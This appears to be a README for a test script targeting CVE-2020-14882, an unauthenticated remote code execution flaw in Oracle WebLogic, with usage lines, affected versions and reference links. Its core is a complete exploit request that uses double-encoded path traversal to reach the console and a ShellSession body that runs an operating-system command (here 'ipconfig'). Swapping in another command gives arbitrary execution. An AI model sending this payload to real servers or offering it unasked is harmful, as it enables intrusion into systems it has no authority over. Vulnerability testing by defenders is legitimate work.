# (CVE-2020–14882) Weblogic Unauthorized bypass RCE
(CVE-2020-14882) Oracle Weblogic Unauthorized bypass RCE test script

# Requests

    POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
    Host: <Target IP>
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-type: application/x-www-form-urlencoded; charset=utf-8
    Content-Length: 128

    _nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('ipconfig');");
    
Test script checks response data with pcre. 

# Usage 
    - 7001/tcp (WebLogic default port) 
    Oracle Weblogic Auth Bypass RCE(CVE-2020–14882).py <Target IP>
    
    - specific port/tcp 
      Oracle Weblogic Auth Bypass RCE(CVE-2020–14882).py <Target IP> <port>
# Affected Version 
WebLogic 10.3.6.0.0
WebLogic 12.1.3.0.0
WebLogic 12.2.1.3.0
WebLogic 12.2.1.4.0
WebLogic 14.1.1.0.0

# PoC 
https://github.com/jas502n/CVE-2020-14882

# reference 
https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf
https://www.tenable.com/blog/cve-2020-14882-oracle-weblogic-remote-code-execution-vulnerability-exploited-in-the-wild
